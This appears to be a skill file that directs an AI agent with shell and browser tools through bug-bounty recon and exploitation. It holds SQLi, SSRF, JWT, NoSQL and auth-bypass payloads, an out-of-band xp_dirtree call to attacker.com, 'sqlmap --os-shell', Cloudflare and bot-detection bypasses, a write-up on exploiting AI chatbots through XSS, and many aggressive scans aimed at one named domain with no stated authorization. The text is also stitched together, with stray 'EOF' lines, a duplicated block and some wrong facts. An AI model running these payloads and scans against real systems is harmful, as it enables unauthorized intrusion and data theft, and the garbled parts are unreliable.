---
name: bug-bounty
description: Automated bug bounty hunting workflow - recon, scanning, and vulnerability assessment. Includes web, mobile, IoT, and binary analysis capabilities.
metadata:
author: ola.zo.computer
allowed-tools: Bash, Read, Grep, Web-Read, Browser
---
# Bug Bounty Hunter Skill
This skill provides a complete recon and vulnerability scanning workflow for bug bounty hunting.
## Core Web Tools
- \*\*subfinder\*\* - Passive subdomain enumeration (/root/go/bin/subfinder)
- \*\*amass\*\* - Subdomain enumeration (backup to subfinder)
- \*\*httpx\*\* - HTTP probing for alive hosts (/root/go/bin/httpx)
- \*\*nmap\*\* - Network scanning and port detection (/usr/bin/nmap)
- \*\*nuclei\*\* - Vulnerability scanning with templates (/root/go/bin/nuclei)
- \*\*ffuf\*\* - Web fuzzing and directory busting (/root/go/bin/ffuf)
- \*\*gowitness\*\* - Website screenshots (/root/go/bin/gowitness)
- \*\*whois\*\* - Domain lookup
- \*\*dig/nslookup\*\* - DNS utilities
## Advanced Tools (For Specialized Attacks)
### Mobile App Analysis
- \*\*Frida\*\* - Dynamic instrumentation for iOS/Android
- \*\*Objection\*\* - Mobile security testing framework
- \*\*Polar Proxy\*\* - HTTPS interception for mobile apps
### IoT/Hardware Hacking
- \*\*eMMC reader\*\* - Extract firmware from IoT devices
- \*\*Hot air station\*\* - Remove chips for firmware extraction
- \*\*Binwalk\*\* - Firmware analysis
- \*\*strct.pack\*\* - Binary struct packing/unpacking
### Binary/Protocol Analysis
- \*\*hex editor (xxd, hexdump)\*\* - Binary analysis
- \*\*protobuf parsers\*\* - Analyze gRPC/Protobuf traffic
- \*\*SIP/VoIP tools\*\* - Test VoIP vulnerabilities (sipgrep, sipp)
## Attack Techniques (From $400K+ Bounties)
### Web Vulnerabilities
1. \*\*URL Encoding Bypass\*\* - Double URL encode to bypass 403 restrictions
2. \*\*IDOR\*\* - Insecure Direct Object Reference in numeric IDs
3. \*\*XSS\*\* - Stored XSS in admin panels
4. \*\*SQLi\*\* - SQL injection in unusual formats (protobuf, binary)
5. \*\*Hardcoded Creds\*\* - Find in JS files, docs, config files
### Key Mindset (Rhynorater)
- Spend 40+ hours understanding an application before expecting bugs
- Threat model changes = new attack surface
- Don't fear new protocols - learn SIP, gRPC, protobuf
- Hardware/IoT bugs often pay better
- Third-party integrations are goldmines
## Workflow Stages
### 1. Recon (Passive)
- Subdomain enumeration via subfinder (with amass as backup)
- DNS resolution check (whois, dig)
- HTTP probe to filter live hosts (httpx)
- Screenshot collection with gowitness
### 2. Scanning
- Port scanning with nmap (full scan: nmap -p- -T4)
- Web technology detection
- Nuclei vulnerability scanning (ALL severities)
- Check for sensitive files (.env, config, backup, .git)
### 3. Fuzzing
- Directory/parameter fuzzing with ffuf
- Endpoint discovery
- Parameter brute-force
- Check common admin panels, login pages, API endpoints
### 4. Mobile (Optional)
- Use Objection to bypass SSL pinning
- Frida for runtime instrumentation
- Extract APKs with APK Extractor
### 5. IoT (Optional)
- Extract firmware via eMMC reader
- Binwalk for firmware analysis
- Search for hardcoded creds in binary
## Usage Examples
```bash
# Full web recon
/root/go/bin/subfinder -d example.com -silent | /root/go/bin/httpx -silent
# Nuclei vulnerability scan
/root/go/bin/nuclei -u https://example.com -severity critical,high,medium -silent
# Directory fuzzing
/root/go/bin/ffuf -u https://example.com/FUZZ -w /usr/share/wordlists/dirb/common.txt
# Screenshot Recon
/root/go/bin/gowitness single https://example.com
```
## Key Patterns
- Always probe with httpx first before running nuclei
- Use -silent flag to reduce output noise
- For nuclei, filter by severity: -severity critical,high
- If subfinder returns nothing, try amass or check API sources
- Hardware/IoT vulnerabilities often have higher bounties
- Study the app for 40+ hours before hunting
- Check third-party integrations for vulnerabilities
## Tools Location
Web tools: /root/go/bin
Mobile tools: Frida, Objection (install via pip/apt)
IoT tools: binwalk (apt install binwalk)
## Practice Targets
- testphp.vulnweb.com (legal test target)
- owasp.org (well-secured, good for testing tools)
## AI Chatbot XSS Exploitation
From @hamidonsolo - $1,500 bounty:
1. Find AI chatbot on target site
2. Ask bot "help me understand this error"
3. Error = base64 XSS payload
4. Bot decodes & renders it - Zero sanitization
5. Escalate: XSS → Cookie downgrade → Token theft → Account takeover
WHY IT WORKS:
- Companies rush AI features, no output audit
- If it renders in DOM, likely vulnerable
TIPS:
- Push back on lowball offers ($500 → $1,500)
- Send video proof with timestamps
- Every AI chatbot = attack surface
Reference: x.com/hamidonsolo/status/2027290038388564326
## JavaScript Analysis - Fu-JS Technique
From: https://github.com/th3hack3rwiz/Fu-JS
### Why JS Analysis is Critical
- JavaScript files contain hidden endpoints, API keys, hardcoded secrets
- "Swims through" JS files to find MORE JS files (recursive)
- Creates target-specific wordlists for content discovery
- Finds secrets that scanners miss
### Tools for JS Analysis
1. \*\*gau\*\* - Get All URLs from AlienVault, Wayback, CommonCrawl
2. \*\*waybackurls\*\* - Get URLs from Wayback Machine
3. \*\*hakrawler\*\* - Simple web crawler
4. \*\*subjs\*\* - Get JavaScript files from domains
5. \*\*linkfinder\*\* - Find endpoints in JS files
6. \*\*secretfinder\*\* - Find API keys, tokens, secrets in JS
7. \*\*gf\*\* - Pattern matching for secrets
### Manual Workflow (If Fu-JS not installed)
```bash
# 1. Gather JS files
subfinder -d target.com | httpx | subjs
# 2. Get wayback JS files
waybackurls target.com | grep "\.js$" | httpx
# 3. Extract endpoints
for js in $(cat js-files.txt); do
python3 linkfinder.py -i $js -o cli
done
# 4. Find secrets
for js in $(cat js-files.txt); do
python3 SecretFinder.py -i $js -o cli
done
# 5. Create wordlist from JS
cat js-files.txt | grep -oP '/[a-zA-Z0-9/]+' | anew wordlist.txt
```
### Key Patterns to Find in JS
- API endpoints (/api/, /v1/, /admin/)
- Hardcoded API keys, tokens, secrets
- Internal IP addresses
- Commented-out code (TODO, FIXME, passwords)
- AWS keys, Firebase configs
- JWT tokens, session cookies
### Install Commands
```bash
go install github.com/lc/gau@latest
go install github.com/tomnomnom/waybackurls@latest
go install github.com/hakluke/hakrawler@latest
go install github.com/lc/subjs@latest
pip3 install linkfinder
pip3 install secretfinder
go install github.com/tomnomnom/unfurl@latest
go install github.com/tomnomnom/anew@latest
go install github.com/tomnomnom/gf@latest
```
## Mantra - API Key Finder (841 stars)
- \*\*Purpose\*\*: Hunt down API key leaks in JS files and pages
- \*\*Install\*\*: `go install github.com/Brosck/mantra@latest`
- \*\*Location\*\*: /root/go/bin/mantra
- \*\*Usage\*\*: `mantra -u https://target.com` or `cat js\_files.txt | mantra`
- \*\*Supported\*\*: Firebase, AWS, Google API keys and more
Added to bug-bounty SKILL.md!
## Hidden Parameter Discovery + XSS via Payment Functions
From: Ahmad Yossef (@a7madn1) - $X bounty
### Attack Vector
1. \*\*Register\*\* an account on target (gets redirected to app.target.com)
2. \*\*Quick Test\*\* search parameters for XSS, open redirect - no results
3. \*\*Discover Hidden Parameters\*\* - Look for undocumented params like "u", "ref", "token"
4. \*\*Find Reflection Points\*\* - Check different app functions (payment pages, settings, etc.)
5. \*\*Exploit\*\* - The "u" parameter was reflected in payment currency switcher
### Key Steps
- Always check hidden/uncommon parameters
- Source code review reveals vulnerable parameters
- Payment/currency switcher functions often reflect user input
- Example: `https://app.target.com/?value=4&fx=0&u=`
### Why It Works
- Developers focus on main search parameters
- Payment functions have different security review
- Hidden parameters often forgotten in security audits
EOF
## Scrapling - Adaptive Web Scraping Framework
From: github.com/D4Vinci/Scrapling (18.3k stars)
### What It Does
- Adaptive web scraping that survives website design changes
- Bypasses anti-bot systems (Cloudflare, etc.) out of the box
- Full spider framework with pause/resume capability
- Multi-session support with proxy rotation
- Built-in MCP server for AI integration
### Key Features for Bug Bounty
- \*\*StealthyFetcher\*\* - Bypasses Cloudflare Turnstile, anti-bot detection
- \*\*Adaptive Parsing\*\* - Parser learns from website changes, auto-relocates elements
- \*\*Concurrent Crawling\*\* - Scale to multi-session crawls
- \*\*Proxy Rotation\*\* - Built-in automatic proxy rotation
### Installation
```bash
pip install scrapling[all]
scrapling install # Install browser dependencies
```
### Usage Examples
```python
from scrapling.fetchers import StealthyFetcher
# Bypass bot detection
p = StealthyFetcher.fetch('https://target.com', headless=True)
# Adaptive parsing - survives website changes
products = p.css('.product', adaptive=True)
```
### Bug Bounty Use Cases
1. \*\*Recon\*\* - Scrape target pages for endpoints, APIs
2. \*\*Parameter Discovery\*\* - Find hidden params across many pages
3. \*\*JavaScript Analysis\*\* - Dynamic content extraction
4. \*\*Bypass WAF/Cloudflare\*\* - StealthyFetcher evades detection
---
## Bypass Bot Detection - Burp Suite Extension
From: PortSwigger BApp Store
### What It Does
- Mutates TLS ciphers to bypass TLS-fingerprint based bot detection
- Allows testing that would normally be blocked
### Modes
- \*\*Firefox Mode\*\* - Firefox ciphers + User-Agent
- \*\*Chrome Mode\*\* - Chrome ciphers + User-Agent
- \*\*Safari Mode\*\* - Safari ciphers + User-Agent
- \*\*HTTP2 Downgrade\*\* - Bypass HTTP/2 fingerprinting
- \*\*Brute Force Mode\*\* - Try different TLS combinations
### Installation
1. Download from BApp Store in Burp Suite Extender
2. Or: Settings -> Network -> TLS -> Enable custom protocols and ciphers
### Usage
1. Right-click on request in Proxy History
2. Extensions -> Bypass bot detection -> Select mode
3. If response changes (different words/headers), vulnerability found
### Bug Bounty Use Cases
- Bypass anti-bot protections on targets
- Access endpoints normally blocked to automated tools
- Test for WAF bypass via TLS fingerprinting
EOF
## Report Structure Template
Use this structure for all bug bounty reports:
```markdown
# [Target] - Vulnerability Assessment
## Executive Summary
Brief overview of findings.
---
## Critical Findings
### 1. [Finding Name] (SEVERITY)
- \*\*Finding\*\*: Description
- \*\*Value/Payload\*\*: Actual data
- \*\*Impact\*\*: Security impact
- \*\*Location\*\*: Where found
### 2. [Finding Name] (SEVERITY)
...
## Medium Findings
### 1. [Finding Name]
...
## Low Findings
### 1. [Finding Name]
...
## Recommendations
Steps to fix each finding.
```
Example for Next.js targets:
- Check for deployment ID in HTML comments
- Extract React component names from SSR
- Find source map paths in static files
- Identify tech stack from meta tags
- Look for empty GA4/GTM IDs (config errors)
- Check API error messages for info disclosure
```
## Cloudflare Bypass Methods
### 1. Scrapling (Recommended)
```bash
pip3 install "scrapling[fetch]"
python3 -c "
from scrapling import Fetcher
f = Fetcher().init()
r = f.get('https://target.com')
print(r.text)
"
```
### 2. Playwright (Browser Automation)
```bash
pip3 install playwright
playwright install chromium
```
Python code shown above in AGENTS.md.
### 3. Manual curl Headers
Always include these headers to bypass basic Cloudflare checks:
- `-H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"`
- `-H "accept: text/html,application/xhtml+xml"`
- `-H "accept-language: en-US,en;q=0.9"`
### Why These Work:
- Scrapling uses curl\_cffi with real browser fingerprints
- Playwright runs actual Chrome browser (Cloudflare sees real browser)
- curl with proper headers mimics real browser requests
## From six2dez/pentest-book (Ultimate Reference)
This is one of the most comprehensive pentesting resources. Key sections:
### Bug Bounty Specific (from others/bugbounty.md)
- Recon methodology for BB targets
- Private program scope testing
- Program-specific techniques
- Report writing tips
### Key Attack Vectors Documented
- All web vulnerabilities: SQLi, XSS, SSRF, XXE, IDOR, LFI, RCE
- API Security testing
- OAuth/PKCE vulnerabilities
- GraphQL security testing
- Race conditions
- Web Cache Poisoning/Deception
- Prototype Pollution
### CMS/Platform Exploits
- WordPress, Drupal, Joomla
- Jenkins, Jira
- Adobe AEM, SAP, Magento
- Firebase, AWS, Azure, GCP
- Serverless vulnerabilities
### Cloud Security
- AWS enumeration & exploitation
- Azure AD attacks
- GCP misconfigurations
- Serverless vulnerabilities
### Tools & Techniques Reference
- Burp Suite extensions (preferred)
- Web fuzzers comparison
- Subdomain enumeration tools review
- Recon suites comparison
- Password cracking
- LLM/AI security testing
### Important Files to Check
- /enumeration/ - Web attack techniques
- /recon/ - Recon methodology
- /exploitation/ - Shells & priv esc
- /post-exploitation/ - AD, Linux, Windows
- /mobile/ - Android & iOS
- /cloud/ - AWS, Azure, GCP, K8s
- /others/ - Tools, checklists, mindmaps
Reference: https://github.com/six2dez/pentest-book (1.9k stars)
## AI-Augmented Threat Actors (From AWS CTI Report)
Source: AWS Threat Intelligence - Feb 2026
### Attack Vector
- Exposed management interfaces (ports 443, 8443, 10443, 4443)
- Weak/reused credentials
- Single-factor authentication
- NOT via exploits - purely credential-based
### High-Value Targets
- FortiGate config files contain:
- SSL-VPN credentials (recoverable passwords)
- Administrative credentials
- Network topology & routing info
- Firewall policies
- IPsec VPN peer configs
### Post-Exploitation Tools
- Meterpreter + mimikatz for DCSync attacks
- Impacket for lateral movement
- gogo - open-source port scanner
- Nuclei for vulnerability scanning
- PowerShell scripts for credential extraction
### CVEs Referenced (in attacks)
- CVE-2019-7192 (FortiGate)
- CVE-2023-27532 (Veeam)
- CVE-2024-40711 (Veeam)
### IOCs (Threat Actor Infrastructure)
- 212.11.64.250 - scanning/exploitation
- 185.196.11.225 - threat operations
### Key Lessons for Bug Bounty
1. AI helps unsophisticated actors scale
2. Strong fundamentals beat advanced attacks
3. Target backup infrastructure (high value)
4. Automated tools = detectable - focus on anomalies
5. AI-generated code lacks robustness - edge cases fail
---
## SQL Injection (SQLi) - Comprehensive Guide
Source: YesWeHack Bug Bounty Guide (2025)
### What is SQL Injection?
SQL injection occurs when untrusted input is embedded into SQL queries, altering intended logic. Can lead to unauthorized data access, modification, deletion, privilege escalation, or RCE.
### Types of SQLi
#### 1. In-band SQLi (Classic)
- Error-based: Trigger database errors to leak info
- UNION-based: Use UNION to extract data from other tables
#### 2. Blind SQLi
- Boolean-based: Infer data from true/false responses
- Time-based: Use SLEEP() to measure response delays
#### 3. Out-of-Band (OOB) SQLi
- DNS/HTTP callbacks when in-band responses are blocked
- Use xp\_dirtree (MSSQL), LOAD\_FILE() (MySQL)
#### 4. Second-Order SQLi
- Malicious input stored, executed later in different context
- Common in microservices
### Key Payloads
#### Basic Detection
```
' OR 1=1-- -
' OR 'a'='a
' ORDER BY 1-- - (find column count)
```
#### UNION-Based
```
' UNION SELECT NULL-- -
' UNION SELECT username,password FROM users-- -
```
#### Time-Based (MySQL)
```
' OR SLEEP(5)-- -
' OR BENCHMARK(40000000,SHA1(1337))-- -
```
#### Time-Based (MSSQL)
```
'; IF (1=1) WAITFOR DELAY '0:0:05'-- -
```
#### Error-Based (MySQL)
```
' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- -
```
#### OOB (MSSQL)
```
'; EXEC master..xp\_dirtree '//attacker.com/sql-- -
```
### Context-Aware Payloads
#### SELECT statements
```
?id=1' OR 1=1-- -
```
#### INSERT statements
```
username: x', (SELECT password FROM users), 'y')-- -
```
#### UPDATE statements
```
comment: x' OR 1=1-- -
```
### WAF Bypass Techniques
1. \*\*Comment obfuscation\*\*: `'/\*\*/OR/\*\*/1=1-- -`
2. \*\*Newline instead of space\*\*: `'OR%0A1=1-- -`
3. \*\*Parentheses\*\*: `'OR(1=1)-- -`
4. \*\*Case randomization\*\*: `'oR 1=1-- -`
### SQLmap Commands
```bash
# Basic scan
sqlmap -u 'http://target.com/search?q=test'
# With cookies
sqlmap -u 'http://target.com/search' --data='q=test' --cookie='PHPSESSID=xxx'
# Specific parameter
sqlmap -u 'http://target.com/search?q=test' -p q --level=5
# Database enumeration
sqlmap -u 'http://target.com/search?q=test' --dbs
# Table enumeration
sqlmap -u 'http://target.com/search?q=test' -D database\_name --tables
# Dump data
sqlmap -u 'http://target.com/search?q=test' -D database\_name -T users --dump
# OS Shell
sqlmap -u 'http://target.com/search?q=test' --os-shell
```
### SQLi Prevention (For Testing)
- Parameterized queries/prepared statements
- Least-privilege database access
- Input validation
- WAF as extra layer
## IDOR Testing Techniques
\*\*Mindset\*\*: Every numeric/string ID that references an object = potential ticket to god-mode.
### Systematic Testing:
1. \*\*Basic ID Manipulation\*\*
- Change ID in URL: `/user/1337` → `/user/1338` (vertical + horizontal)
- Change IDs in API requests: `{"user\_id": 1337}` → `{"user\_id": 1338}`
2. \*\*Advanced Techniques\*\*
- Array wrapping: `id=1337` → `id[]=1337&id[]=1338`
- JSON body: add extra parameters like `{"role":"admin"}` or `{"is\_owner":true}`
- GUID/UUID flipping (last 4 chars usually sequential)
- Base64 decode → increment → re-encode
- Hash manipulation: crack with known plaintext (MD5(1337) etc.)
3. \*\*Automation\*\*
- Burp Intruder + custom wordlist (1..999999, UUID v4 patterns)
- Look for 200 OK with different user data
### Key Endpoints to Test:
- `/api/user/{id}`
- `/profile/{id}/edit`
- `/api/orders/{id}`
- `/api/records/{id}/delete`
- Any PUT/PATCH/DELETE with IDOR potential
### Test Cases:
- \*\*Horizontal\*\*: Access another user's same-level resource
- \*\*Vertical\*\*: Access admin/superuser resources as regular user
- \*\*Object-level\*\*: Access another object's data (e.g., private document)
### Look For:
- 200 OK with different user data
- Different response size
- Extra fields in JSON response
- Status code changes (sometimes 403 with admin data inside)
### SSRF (Server-Side Request Forgery)
Exploit server-side request handling to access internal services, cloud metadata
#### Cloud Metadata Endpoints
```
# AWS
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data
# Google
http://metadata.google.internal/computeMetadata/v1/
# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```
#### Basic Protocols (all supported)
```
http://127.0.0.1:8080/
http://localhost:22/
file:///etc/passwd
gopher://127.0.0.1:3306/\_mysql
dict://127.0.0.1:11211/stat
ftp://internal-server/
tftp://attacker/
ldap://127.0.0.1
data:text/plain;base64,SSBsb3ZlIFNRRkU=
```
#### Advanced Techniques
1. \*\*Redirect Chains\*\*: Send server to your collab server (302) -> internal
2. \*\*DNS Rebinding\*\*: Domain resolves to external, then 127.0.0.1 after TTL
3. \*\*URL Scheme Abuse\*\*: ftp://, tftp://, ldap://, data: schemes
4. \*\*Bypass Methods\*\*:
- http://127.0.0.1%00@attacker.com
- IPv6: http://[::1]:80/
- Decimal: http://2130706433
- Hex: http://0x7f000001
- Use DNS wildcard pointing to internal IPs
\*\*Tools:\*\*
- interactsh - Collaborative SSRF testing (generate interaction URLs)
- ssrfmap - Automated SSRF exploitation tool
- goggles - Multi-purpose SSRF scanner
## Authentication Bypass Methods
### SQL Injection
- `admin' OR '1'='1` - Classic SQLi auth bypass
- `admin'--` - Comment out password check
### NoSQL Injection
- `{"username":"admin","password":{"$ne":null}}` - MongoDB bypass using $ne (not equal)
- `{"username":{"$ne":""},"password":{"$ne":""}}` - Login as any user
- `{"username":"admin","password":{"$regex":"^.\*"}}` - Regex bypass
### JWT Attacks
- Remove signature: `{"alg":"none","typ":"JWT"}` - Set algorithm to "none"
- Algorithm confusion: Sign HS256 key with RS256 public key
- Key confusion: Use public key as secret for HS256
### Cookie Manipulation
- `Role=admin; Path=/` - Direct cookie injection
- `Authenticated=true` - Boolean flip
- `User=admin` - Add admin parameter
### OTP/2FA Bypass
- \*\*Race condition\*\*: Send 10 concurrent requests with same OTP
- \*\*Timing attack\*\*: Slightly modify timing to bypass rate limits
- \*\*OTP reuse\*\*: Try previously used OTPs
- \*\*Brute force\*\*: Quick sequential attempts
### Magic Link/Token Bypass
- `?email=admin@target.com%00@evil.com` - Email parameter pollution
- `?email=admin@target.com&redirect=` - Append redirect
- Token prediction: Analyze patterns in generated tokens
### Session Attacks
- \*\*Session fixation\*\*: Set user's session ID before they login
- \*\*Session prediction\*\*: Analyze session ID patterns (base64, timestamps)
- \*\*Session hijacking\*\*: Steal via XSS, MITM, or logs
### OAuth/SSO Bypass
- Redirect URI manipulation
- State parameter removal
- Token leakage via referrer
## OAuth Vulnerabilities
### Redirect URI Chaos
- Open redirect: redirect\_uri=https://target.com?redirect\_uri=https://evil.com
- Subdomain wildcard: redirect\_uri=https://target.com.evil.com
- response\_type=token in GET (steal token via referrer)
- PKCE bypass: send code\_challenge but don't verify
- State parameter missing → CSRF on auth
- Implicit flow + fragment stealing access token
### Tools
- oauth2c
- Auth0 misconfig scanner
## JWT Attacks (JSON Web Token)
Always check these 5 things in order:
### 1. Algorithm Confusion
- alg: none → remove signature, set alg: none
- Tool: jwt\_tool -S none -p ""
### 2. Weak Secret
- alg: HS256 + weak secret → jwt\_tool -d wordlist.txt
- Tool: hashcat, jwt\_tool -d
### 3. Kid Parameter Injection
- {"kid":"../../dev/null"} → path traversal
- {"kid":"file:///etc/passwd"} → LFI
- SQL injection in kid parameter
### 4. JWK / JKU SSRF
- jku parameter → SSRF to malicious JWKS
- x5u parameter → SSRF to malicious X.509 cert
- Tool: jwt\_tool -J
### 5. Claims Manipulation
- aud / iss manipulation
- exp tampering (iat + nbf tricks)
- null JWT handling
### Tools
- jwt\_tool (python3 -m pip install jwt\_tool)
- c-jwt-cracker
- hashcat (HMAC mode)
## GraphQL Security Testing
### 1. Introspection First
Always enable introspection to get full schema:
```graphql
{\_\_schema{queryType{name} mutationType{name}}}
```
Or query types directly:
```graphql
{\_\_types{name fields{name type{name}}}}
```
### 2. Batch Attacks
Send multiple queries in one request - bypass rate limits:
```json
[
{"query": "mutation{login{...}}"},
{"query": "mutation{adminAction{...}}"}
]
```
### 3. Deep Recursion (DoS)
Exhaust server resources with deep nesting:
```graphql
{
deeply {
nested {
query {
creating {
many {
objects {
that {
cause {
performance {
issues
}
}
}
}
}
}
}
}
}
}
```
### 4. Field Suggestions Abuse
Most GraphQL frameworks leak schema via field suggestions. Query non-existent fields to discover valid ones:
```graphql
{
userAdmins {
ssrn
}
}
```
### 5. Alias Flooding
Bypass rate limits by using multiple aliases:
```graphql
{
a1: user(id:1){id}
a2: user(id:2){id}
a3: user(id:3){id}
# ... 50+ aliases
}
```
### 6. Directive Manipulation
Exploit @include(if:) and @skip(if:) directives:
```graphql
query ($admin: Boolean) {
secretData @include(if: $admin) {
password
}
}
```
### 7. Query Complexity Attacks
Send deeply nested queries to cause DoS:
```graphql
{
deeply {
nested {
query {
creating {
many {
objects {
that {
cause {
performance {
issues
}
}
}
}
}
}
}
}
}
}
```
### Tools
- \*\*GraphQL Voyager\*\* - Visualize schema
- \*\*InQL\*\* - Burp Suite extension for GraphQL
- \*\*graphql-path-enum\*\* - Enumerate paths in GraphQL
- \*\*Altair GraphQL Client\*\* - Query builder
- \*\*Insomnia\*\* - GraphQL testing
### Bug Bounty Tips
- Always check if introspection is enabled (should be disabled in prod)
- Look for query complexity analysis settings
- Test for IDOR in nested queries
- Check if mutations accept arbitrary input
## Race Condition Exploitation
From: Rhynorater, Bug Bounty Methodology Expert
### What Are Race Conditions?
When multiple requests execute simultaneously and the server fails to properly sequence them, allowing bypass of validation, rate limits, or business logic.
### High-Value Targets
1. \*\*Negative balance\*\* - Withdraw/deposit race to go negative
2. \*\*Coupon stacking\*\* - Apply multiple coupons meant for single use
3. \*\*2FA bypass\*\* - Multiple OTP submissions before lockout
4. \*\*Wallet overflow\*\* - Concurrency in crypto/fiat balance updates
### Tools for Race Conditions
#### racepwn (Turbo-Intruder Fork)
- Enhanced version of Turbo-Intruder for race conditions
- Python-based with asyncio support
- GitHub: https://github.com/1n-br0/racepwn
#### asyncio + httpx
```python
import asyncio
import httpx
async def race\_attack():
async with httpx.AsyncClient() as client:
tasks = [
client.post(url, data=payload)
for \_ in range(10)
]
await asyncio.gather(\*tasks)
asyncio.run(race\_attack())
```
#### Burp Turbo Intruder
- Send 50+ requests with 0.01s clusters
- Enable "Neighbour" analysis for timing windows
- Throttle until you find the sweet spot
### The Billion Dollar Bug
Simultaneous requests can:
- Bypass validation logic (check-then-act races)
- Circumvent rate limits entirely
- Create duplicate transactions
- Influence lottery/raffle outcomes
### Key Techniques
1. \*\*Time-of-check to time-of-use (TOCTOU)\*\* - Race between validation and execution
2. \*\*Parallel processing exploits\*\* - Multiple requests hit backend simultaneously
3. \*\*Database locking bypasses\*\* - Exploit transaction isolation levels
### Testing Methodology
1. Identify sensitive endpoints (balance, payments, auth)
2. Send concurrent requests (5-50 simultaneous)
3. Analyze response ordering and final state
4. Iterate with different payload combinations

## Additional Web Tools (February 2025)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools (February 2025)

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### dirb - Directory Brute Forcing
**Location**: `/usr/bin/dirb`
**Purpose**: Discover hidden directories and files on web servers

**Use Cases**:
```bash
# Basic scan
dirb http://target.com/

# With custom wordlist
dirb http://target.com /usr/share/wordlists/dirb/common.txt

# Scan with extensions
dirb http://target.com /usr/share/wordlists/dirb/common.txt -o results.txt

